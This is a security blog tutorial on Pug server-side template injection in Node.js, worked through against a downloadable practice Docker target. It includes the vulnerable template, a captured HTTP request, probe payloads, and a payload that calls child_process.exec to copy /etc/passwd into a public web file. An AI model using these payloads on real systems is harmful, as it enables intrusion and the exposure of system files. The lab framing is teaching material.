<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2"><link rel="apple-touch-icon" sizes="180x180" href="/en/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/en/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/en/images/favicon-16x16-next.png"><link rel="mask-icon" href="/en/images/logo.svg" color="#222"><meta name="google-site-verification" content="7yRqtT6cCpC-_R-rzM9gUoQGmheV9OZAUKIXrbAsyqE"><link rel="stylesheet" href="/en/css/main.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous"><script class="next-config" data-name="main" type="application/json">{"hostname":"sunra.top","root":"/en/","images":"/en/images","scheme":"Muse","darkmode":false,"version":"8.16.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/en/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/en/js/config.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8623125811074939" crossorigin="anonymous"></script><script>!function(e,p,s,r){if(void 0===e.webpushr){e.webpushr=e.webpushr||function(){(e.webpushr.q=e.webpushr.q||[]).push(arguments)};var d,t=p.getElementsByTagName(s)[0];(d=p.createElement(s)).id="webpushr-jssdk",d.async=1,d.src="https://cdn.webpushr.com/app.min.js",t.parentNode.appendChild(d)}}(window,document,"script"),webpushr("setup",{key:"BEQjc-0d1Q1CubrYZ2e2XXv5Is0ZCd3CtrNLet06owkUWK68qkxHpho2mKdnj2vpGdxddRDxRYthLuMwrTqfSB4"})</script><meta name="description" content="Node.js allows you to run JavaScript outside of the browser. Due to its streamlined, fast, and cross-platform nature, Node.js can greatly simplify projects by unifying the stack. Although Node.js is n"><meta property="og:type" content="article"><meta property="og:title" content="XSS Template Injection and Remote Code Execution"><meta property="og:url" content="https://sunra.top/en/posts/56427/index.html"><meta property="og:site_name" content="Origin of Ray"><meta property="og:description" content="Node.js allows you to run JavaScript outside of the browser. Due to its streamlined, fast, and cross-platform nature, Node.js can greatly simplify projects by unifying the stack. Although Node.js is n"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2021-09-20T23:12:47.000Z"><meta property="article:modified_time" content="2023-08-12T14:30:19.931Z"><meta property="article:author" content="Ray Sun"><meta property="article:tag" content="Technology Sharing Using Tutorials Principles Front End Computer Graphics"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://sunra.top/en/posts/56427/"><script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://sunra.top/en/posts/56427/","path":"posts/56427/","title":"XSS Template Injection and Remote Code Execution"}</script><script class="next-config" data-name="calendar" type="application/json">""</script><title>XSS Template Injection and Remote Code Execution | Origin of Ray</title><script async src="https://www.googletagmanager.com/gtag/js?id=G-KEJ1L66CKC"></script><script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-KEJ1L66CKC","only_pageview":false}</script><script src="/en/js/third-party/analytics/google-analytics.js"></script><script src="/en/js/third-party/analytics/baidu-analytics.js"></script><script async src="https://hm.baidu.com/hm.js?cc2e15dfd66849cf1d7843d0d532438e"></script><link rel="dns-prefetch" href="https://blog-comments-3w44.vercel.app/"><noscript><link rel="stylesheet" href="/en/css/noscript.css"></noscript><link rel="alternate" href="/en/atom.xml" title="Origin of Ray" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><div class="column"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar" role="button"><span class="toggle-line"></span><span class="toggle-line"></span><span class="toggle-line"></span></div></div><div class="site-meta"><a href="/en/" class="brand" rel="start"><i class="logo-line"></i><p class="site-title">Origin of Ray</p><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">Lift the fog of the Internet together</p></div><div class="site-nav-right"><div class="toggle popup-trigger" aria-label="Search" role="button"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/en/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/en/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/en/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-english"><a href="https://sunra.top/en" rel="section"><i class="fa fa-language fa-fw"></i>English</a></li><li class="menu-item menu-item-中文"><a href="https://sunra.top/" rel="section"><i class="fa fa-language fa-fw"></i>中文</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> Search</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"> <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="Searching..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close" role="button"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class="search-result-icon"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></header><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc"> Table of Contents</li><li class="sidebar-nav-overview"> Overview</li></ul><div class="sidebar-panel-container"><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Template-engine"><span class="nav-number">1.</span> <span class="nav-text">Template engine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Template-injection"><span class="nav-number">2.</span> <span class="nav-text">Template injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PUG"><span class="nav-number">2.1.</span> <span class="nav-text">PUG</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#String-embedding-translation"><span class="nav-number">2.1.1.</span> <span class="nav-text">String embedding, translation</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#String-embedded-not-translated"><span class="nav-number">2.1.2.</span> <span class="nav-text">String embedded, not translated</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-Remote-Code-Execution"><span class="nav-number">3.</span> <span class="nav-text">RCE (Remote Code Execution)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Principle"><span class="nav-number">3.1.</span> <span class="nav-text">Principle</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Shell-execution"><span class="nav-number">3.1.1.</span> <span class="nav-text">Shell execution</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#How-to-quickly-find-code-vulnerabilities-in-template-engines"><span class="nav-number">4.</span> <span class="nav-text">How to quickly find code vulnerabilities in template engines</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="Ray Sun" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg"><p class="site-author-name" itemprop="name">Ray Sun</p><div class="site-description" itemprop="description">Lift the fog of the Internet together</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/en/archives/"><span class="site-state-item-count">268</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"> <a href="/en/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">categories</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><a href="https://github.com/Sun668" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Sun668" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i> GitHub</a></span><span class="links-of-author-item"><a href="mailto:947692259@qq.com" title="E-Mail → mailto:947692259@qq.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i> E-Mail</a></span></div><div class="cc-license animated" itemprop="license"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a></div></div></div></div><div class="wechat_channel" style="width:50%;margin-left:25%;margin-bottom:5px"><br> <img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1685836114/origin-of-ray/wechat_channel_zmg0hw.jpg"></div><div class="wechat_channel" style="width:50%;margin-left:25%"><br> <span>一站式程序员工具平台</span> <img src="https://origin-of-ray.oss-cn-shenzhen.aliyuncs.com/rannie_share.png"></div></aside></div><div class="main-inner post posts-expand"><div class="post-block"><article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en"><link itemprop="mainEntityOfPage" href="https://sunra.top/en/posts/56427/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg"><meta itemprop="name" content="Ray Sun"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Origin of Ray"><meta itemprop="description" content="Lift the fog of the Internet together"></span><span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork"><meta itemprop="name" content="XSS Template Injection and Remote Code Execution | Origin of Ray"><meta itemprop="description" content></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> XSS Template Injection and Remote Code Execution</h1><div class="post-meta-container"><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2021-09-21 07:12:47" itemprop="dateCreated datePublished" datetime="2021-09-21T07:12:47+08:00">2021-09-21</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i></span> <span class="post-meta-item-text">Edited on</span> <time title="Modified: 2023-08-12 22:30:19" itemprop="dateModified" datetime="2023-08-12T22:30:19+08:00">2023-08-12</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/en/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a></span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i></span> <span class="post-meta-item-text">Waline:</span><a title="waline" href="/en/posts/56427/#waline" itemprop="discussionUrl"><span class="post-comments-count waline-comment-count" data-path="/en/posts/56427/" itemprop="commentCount"></span></a></span></div></div></header><div class="post-body" itemprop="articleBody"><p>Node.js allows you to run JavaScript outside of the browser. Due to its streamlined, fast, and cross-platform nature, Node.js can greatly simplify projects by unifying the stack. Although Node.js is not a web server, it allows servers (things that can be programmed in JavaScript) to exist in environments outside of the actual web client.<br>As Node.js becomes more and more popular, its security issues are the focus of hackers and security researchers.</p><span id="more"></span><h2 id="Template-engine"><a href="#Template-engine" class="headerlink" title="Template engine"></a>Template engine</h2><p>Template engine allows (website) programs to achieve interface and data separation, business code and logic code separation, which greatly improves development efficiency, good design also makes code reuse easier.</p><p>Pug is a robust, flexible, and feature-rich HTML template engine developed specifically for the Node.js platform. Pug was renamed from Jade. Pug writes code by indentation (representing the nested relationship between tags). During the compile process, there is no need to consider whether the tag is closed or not.</p><p>This is the official website of pug, you can take a look at its syntax: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.pugjs.cn/api/getting-started.html">https://www.pugjs.cn/api/getting-started.html</a>.</p><h2 id="Template-injection"><a href="#Template-injection" class="headerlink" title="Template injection"></a>Template injection</h2><p>The server level accepts user input as part of the web application template, allowing the underlying template to be modified and the template engine to execute malicious content inserted by the user during rendering.</p><p>This can be used maliciously in wikis, WSYWIG, or email templates. This rarely happens inadvertently, so it is often misinterpreted as just XSS.</p><h3 id="PUG"><a href="#PUG" class="headerlink" title="PUG"></a>PUG</h3><p>First, you can download a target drone</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull registry.cn-shanghai.aliyuncs.com/yhskc/chatsys:latest </span><br><span class="line">docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/chatsys</span><br></pre></td></tr></table></figure><p>After running, you can choose one of the PUG XSS types for actual combat. There are five types in total, and each type prompts what the template in the background code is.</p><p>You can also download PUG template directly to see what the complete background template code is? I just posted it here.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html (long = &#x27;and&#x27;)</span><br><span class="line">  head</span><br><span class="line">    meta(charset=&#x27;UTF-8&#x27;)</span><br><span class="line">    title Chat Support Systems</span><br><span class="line">    meta(name=&#x27;viewport&#x27;, content=&#x27;width=device-width, initial-scale=1&#x27;)</span><br><span class="line">    link(href=&#x27;/stylesheets/stylesNew.css&#x27;, rel=&#x27;stylesheet&#x27;)</span><br><span class="line">    script.</span><br><span class="line">      var toggle = function(id) &#123;</span><br><span class="line">      var mydiv = document.getElementById(id);</span><br><span class="line">      if (mydiv.style.display = &#x27;none&#x27; || mydiv.style.display = &#x27;&#x27;)</span><br><span class="line">      mydiv.style.display = &#x27;block&#x27;;</span><br><span class="line">      else</span><br><span class="line">      mydiv.style.display = &#x27;none&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">  body.home</span><br><span class="line">    .center</span><br><span class="line">      .navigation</span><br><span class="line">        .left</span><br><span class="line">          .logo</span><br><span class="line">            p</span><br><span class="line">              img(src=&#x27;/pics/logo2.png&#x27;, alt=&#x27;logo&#x27;)</span><br><span class="line">              | Chat Support Systems</span><br><span class="line">        .right</span><br><span class="line">          a.link(href=&#x27;/&#x27;) Home</span><br><span class="line">          |</span><br><span class="line">          a.link(href=&#x27;/chatchannel/1&#x27;) Chat</span><br><span class="line">      br</span><br><span class="line">      br</span><br><span class="line">      script.</span><br><span class="line">        var user3 = #&#123;name3&#125;;</span><br><span class="line">      script.</span><br><span class="line">        var user5 = #&#123;name5&#125;;</span><br><span class="line">      </span><br><span class="line">      form(method=&quot;get&quot; action=&quot;&quot;)</span><br><span class="line">        br</span><br><span class="line">        br</span><br><span class="line">        input(type=&#x27;button&#x27;, value=&#x27;Exercise 1&#x27;, onclick=&#x27;toggle(&quot;ex1&quot;);&#x27;)</span><br><span class="line">        #ex1</span><br><span class="line">          b Escaped String Interpolation</span><br><span class="line">          br</span><br><span class="line">          pre.</span><br><span class="line">            p No results found for \#&#123;name1&#125;</span><br><span class="line">          input(type=&#x27;text&#x27;, placeholder=&#x27;name1&#x27; name=&#x27;name1&#x27;)</span><br><span class="line">          p No results found for #&#123;name1&#125;</span><br><span class="line">        br</span><br><span class="line">        input(type=&#x27;button&#x27;, value=&#x27;Exercise 2&#x27;, onclick=&#x27;toggle(&quot;ex2&quot;);&#x27;)</span><br><span class="line">        #ex2</span><br><span class="line">          b Unescaped String Interpolation </span><br><span class="line">          br</span><br><span class="line">          pre.</span><br><span class="line">            p No results found for ! &#123;name2&#125;</span><br><span class="line">          input(type=&#x27;text&#x27;, placeholder=&#x27;name2&#x27; name=&#x27;name2&#x27;)</span><br><span class="line">          p No results found for !&#123;name2&#125;</span><br><span class="line">        br</span><br><span class="line">        input(type=&#x27;button&#x27;, value=&#x27;Exercise 3&#x27;, onclick=&#x27;toggle(&quot;ex3&quot;);&#x27;)</span><br><span class="line">        #ex3</span><br><span class="line">          b Escaped String Interpolation into dynamic inline Javascript</span><br><span class="line">          br</span><br><span class="line">          pre.</span><br><span class="line">            script.</span><br><span class="line">              var user3 = \#&#123;name3&#125;;</span><br><span class="line">            .</span><br><span class="line">            .</span><br><span class="line">            p No results found for \#&#123;name3&#125;</span><br><span class="line">          input(type=&#x27;text&#x27;, placeholder=&#x27;name3&#x27; name=&#x27;name3&#x27;)</span><br><span class="line">          p No results found for #&#123;name3&#125;</span><br><span class="line">        br</span><br><span class="line">        input(type=&#x27;button&#x27;, value=&#x27;Exercise 4&#x27;, onclick=&#x27;toggle(&quot;ex4&quot;);&#x27;)</span><br><span class="line">        #ex4</span><br><span class="line">          b Unescaped buffered code</span><br><span class="line">          br</span><br><span class="line">          pre.</span><br><span class="line">            p!= &#x27;No results found for &#x27;+name4</span><br><span class="line">          input(type=&#x27;text&#x27;, placeholder=&#x27;name4&#x27; name=&#x27;name4&#x27;)</span><br><span class="line">          p!= &#x27;No results found for &#x27;+name4</span><br><span class="line">        br</span><br><span class="line">        input(type=&#x27;button&#x27;, value=&#x27;Exercise 5&#x27;, onclick=&#x27;toggle(&quot;ex5&quot;);&#x27;)</span><br><span class="line">        #ex5</span><br><span class="line">          b Escaped String Interpolation into escaped dynamic inline Javascript</span><br><span class="line">          br</span><br><span class="line">          pre.</span><br><span class="line">            script.</span><br><span class="line">              var user3 = \#&#123;name5&#125;;</span><br><span class="line">            .</span><br><span class="line">            .</span><br><span class="line">            p No results found for \#&#123;name5&#125;</span><br><span class="line">          input(type=&#x27;text&#x27;, placeholder=&#x27;name5&#x27; name=&#x27;name5&#x27;)</span><br><span class="line">          p= &#x27;No results found for &#x27;+name5</span><br><span class="line">        br</span><br><span class="line">        br</span><br><span class="line">        input(type=&#x27;submit&#x27;, value=&#x27;Submit&#x27;)</span><br><span class="line">    include footer.pug</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>We can refer to this official doc to see how this template syntax is used: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.pugjs.cn/language/interpolation.html">https://www.pugjs.cn/language/interpolation.html</a></p><h4 id="String-embedding-translation"><a href="#String-embedding-translation" class="headerlink" title="String embedding, translation"></a>String embedding, translation</h4><p>This is the name3 exercise, that is, ‘script.var user3 = #{name3};’, the official doc says:</p><p>The code inside #{and} will also be evaluated, escaped, and finally embedded in the rendered output of the template. It can be any correct JavaScript expression, you are free to play around with it. Pug is smart enough to figure out where the end of the embedded expression is, so you don’t have to worry about} in the expression, and you don’t need extra escaping. If you need to represent a #{text, you can escape it or generate it with the embedding function (yes, this is very metaprogramming).</p><p>Then we enter a piece of’alert (1) ‘, then this piece of code can be successfully executed</p><h4 id="String-embedded-not-translated"><a href="#String-embedded-not-translated" class="headerlink" title="String embedded, not translated"></a>String embedded, not translated</h4><p>This is an exercise for name2, that is, here’No results found for! {name2} ‘, where name2 is untranslated and can be injected with any code.</p><h2 id="RCE-Remote-Code-Execution"><a href="#RCE-Remote-Code-Execution" class="headerlink" title="RCE (Remote Code Execution)"></a>RCE (Remote Code Execution)</h2><p>The program does not detect input properly, allowing attackers to execute unexpected code or system commands. This allows attackers to obtain Webshell and gain control rights over the host. It must be looked for in every intrusion and web application penetration test.</p><p>In the Node.js project, JavaScript is used as the development language. If there is a template injection vulnerability, it will often be upgraded to RCE (Remote Command Execution).</p><h3 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h3><p>To get shell execution, we have to find the right function to execute in Node/JavaScript.<br>In JavaScript, there is a special object called Global Object, which and all its properties can be accessed anywhere in the program, namely global variables.<br>In browser JavaScript, usually window is a global object, while the global object in Node.js is global, and all global variables (except global itself) are properties of the global object.<br>We will identify the root node of our own global object, and then proceed to determine which modules and functions we can access. We <strong>In Pug, the “=” character allows us to output JavaScript results.</strong></p><h4 id="Shell-execution"><a href="#Shell-execution" class="headerlink" title="Shell execution"></a>Shell execution</h4><p>You want to eventually import child_process using the Require function to run operating system commands.</p><p>In the drone container we just downloaded, select DirectMessage.</p><p>Then try to send a normal request based on the usage page, and use Burp to fetch the request.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /ti?user=123&amp;comment=123&amp;link=123 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;93&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;macOS&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost/directmessage</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: donotdecodeme=eyJtb2R1bGUiOiJub2RlLXNlcmlhbGl6ZSJ9; connect.sid=s%3AVU1ANHOw6j5S8Ygfy1tLdf3AczQ39l62.PhsSveuhXOGInftaGxO4Nk7GowYsYOUH9EtCzAopQsY</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>This is the returned raw.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 94</span><br><span class="line">ETag: W / &quot;5e-J9rgth9jWBVgwNEi1Bjz4VVG + F8&quot;</span><br><span class="line">Date: Tue, 21 Sep 2021 02:59:09 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url=/directmessage&quot;/&gt;&lt;p&gt;Message has been sent to 123&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>This is the request caught by burp. You can see that the content of our user is rendered by the pug in the background. We try to execute a piece of code here to make the user ‘= 8 * 8’. Here, we need to use the encoder of burp to perform url encoding and then put it in.</p><p>After trying, we found that it can indeed be executed and returned 64, which means that this code has an xss injection vulnerability, where we can execute any code we want.</p><p>Note that the following code is written in the original form, and you need to code it first when injecting it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">each val,index in global</span><br><span class="line">  p=index</span><br></pre></td></tr></table></figure><p>After this code is injected, each attribute of the global variable will be output as a p tag, and we can obtain all the attributes.</p><p>Then gradually search, we will find’global.process.mainModule.require ‘, which is the require statement we used, and then we can construct such a code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x = global.process.mainModule.require</span><br><span class="line">x(&#x27;child_process&#x27;).exec(&#x27;cat /etc/passwd &gt;&gt; /opt/web/chatSupportSystems/public/account.txt&#x27;)</span><br></pre></td></tr></table></figure><p>In this way, when we access the account.txt file again, we can get all the passwds.</p><h2 id="How-to-quickly-find-code-vulnerabilities-in-template-engines"><a href="#How-to-quickly-find-code-vulnerabilities-in-template-engines" class="headerlink" title="How to quickly find code vulnerabilities in template engines"></a>How to quickly find code vulnerabilities in template engines</h2><p>You can use tplmap to find vulnerabilities, similar to sqlmap.</p></div><footer class="post-footer"><div class="post-copyright"><ul><li class="post-copyright-author"> <strong>Post author:</strong> Ray Sun</li><li class="post-copyright-link"> <strong>Post link:</strong> <a href="https://sunra.top/en/posts/56427/" title="XSS Template Injection and Remote Code Execution">https://sunra.top/en/posts/56427/</a></li><li class="post-copyright-license"> <strong>Copyright Notice:</strong> All articles in this blog are licensed under<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i> BY-NC-SA</a> unless stating additionally.</li></ul></div><div class="followme"> <span>Welcome to my other publishing channels</span><div class="social-list"><div class="social-item"><span class="social-link"><span class="icon"><i class="fab fa-weixin"></i></span> <span class="label">WeChat</span></span> <img class="social-item-img" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1685836114/origin-of-ray/wechat_channel_zmg0hw.jpg"></div><div class="social-item"><a target="_blank" class="social-link" href="/en/atom.xml"><span class="icon"><i class="fa fa-rss"></i></span> <span class="label">RSS</span></a></div></div></div><div class="post-nav"><div class="post-nav-item"><a href="/en/posts/17764/" rel="prev" title="XSS Worm Definition and Practical Analysis"><i class="fa fa-chevron-left"></i> XSS Worm Definition and Practical Analysis</a></div><div class="post-nav-item"> <a href="/en/posts/14413/" rel="next" title="Operating System Learning Notes (1) Characteristics and Development Classification of Operating Systems">Operating System Learning Notes (1) Characteristics and Development Classification of Operating Systems<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="waline"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2023</span><span class="with-love"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">Ray Sun</span></div><div class="powered-by">Powered by <a href="https://hexo.io/" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="external nofollow noopener noreferrer" target="_blank">NexT.Muse</a></div></div></footer><div class="toggle sidebar-toggle" role="button"><span class="toggle-line"></span><span class="toggle-line"></span><span class="toggle-line"></span></div><div class="sidebar-dimmer"></div><div class="back-to-top" role="button" aria-label="Back to top"><i class="fa fa-arrow-up fa-lg"></i> <span>0%</span></div><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script><script 